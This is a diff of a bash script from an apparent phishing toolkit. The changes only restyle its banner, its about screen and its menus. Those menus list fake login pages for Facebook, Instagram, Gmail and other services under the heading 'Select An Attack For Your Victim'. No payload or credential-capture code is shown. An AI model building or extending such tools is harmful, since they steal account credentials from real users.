@@ -66,9 +66,8 @@ ${CYAN}| '__/ _ \ '_ \ / _\` |/ _ \ '__| | '_ \| '_ \| / __| '_ \ / _ \ '__|
 ${CYAN}| | |  __/ | | | (_| |  __/ |    | |_) | | | | \__ \ | | |  __/ |     
 ${CYAN}|_|  \___|_| |_|\__,_|\___|_|    | .__/|_| |_|_|___/_| |_|\___|_|     
 ${CYAN}                                 | |                                  
-${CYAN}                                 |_|   ${RED}Version : ${__version__} 
+${ORANGE}   Tool created by Render        |_|   ${RED}Version: ${__version__} 
 
-${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by render${WHITE}
 EOF
 }
 
@@ -338,15 +337,15 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}RENDER ${RED}
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/render437
-		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
+		${WHITE} Author: render437
+		${WHITE} Github: https://github.com/render437
+		${WHITE} Version: ${__version__}
 
 		${RED} Warning:${RESET}
 		${ORANGE}  This tool is made for educational purposes only. 
 		The author will not be responsible for any misuse of this tool!${RESET}
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${WHITE}00. Main Menu     ${WHITE}99. Exit
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${BRIGHT_GREEN} Select an option : ${BLUE}"
@@ -605,10 +604,10 @@ custom_url() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		${WHITE}1. Traditional Login Page
+		${WHITE}2. Advanced Voting Poll Login Page
+		${WHITE}3. Fake Security Login Page
+		${WHITE}4. Facebook Messenger Login Page
 
 	EOF
 
@@ -641,10 +640,10 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		${WHITE}1. Traditional Login Page
+		${WHITE}2. Auto Followers Login Page
+		${WHITE}3. 1000 Followers Login Page
+		${WHITE}4. Blue Badge Verify Login Page
 
 	EOF
 
@@ -677,9 +676,9 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		${WHITE}1. Gmail Old Login Page
+		${WHITE}2. Gmail New Login Page
+		${WHITE}3. Advanced Voting Poll
 
 	EOF
 
@@ -708,31 +707,22 @@ site_gmail() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${MAGENTA}[${CYAN}::${MAGENTA}]${BLUE} Select An Attack For Your Victim ${MAGENTA}[${CYAN}::${MAGENTA}]${BLUE}
+		${WHITE}Select An Attack For Your Victim
 
-		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Facebook
-		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram
-		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google
-		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Cryto
-		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Microsoft
-		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Netflix
-		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Paypal
-		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Tiktok
-		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Snapchat
-		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Spotify
-		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Github
-		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Discord
-		${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Roblox
-		${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Steam
-		${MAGENTA}[${CYAN}15${MAGENTA}]${BLUE} Playstation
-		${MAGENTA}[${CYAN}16${MAGENTA}]${BLUE} Xbox
-		${MAGENTA}[${CYAN}17${MAGENTA}]${BLUE} Verizon
+		${WHITE}1. Facebook		${WHITE}10. Spotify
+		${WHITE}2. Instagram		${WHITE}11. Github
+		${WHITE}3. Google		${WHITE}12. Discord
+		${WHITE}4. Cryto		${WHITE}13. Roblox
+		${WHITE}5. Microsoft		${WHITE}14. Steam
+		${WHITE}6. Netflix		${WHITE}15. Playstation
+		${WHITE}7. Paypal		${WHITE}16. Xbox
+		${WHITE}8. Tiktok		${WHITE}17. Verizon
+		${WHITE}9. Snapchat		${WHITE}18. will add more when i feel like it
 		
-		${MAGENTA}[${CYAN}99${MAGENTA}]${BLUE} About         ${MAGENTA}[${CYAN}00${MAGENTA}]${BLUE} Exit
-
+		${WHITE}99. About         ${WHITE}0. Exit
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${WHITE}Select an option:"
 
 	case $REPLY in 
 		1 | 01)
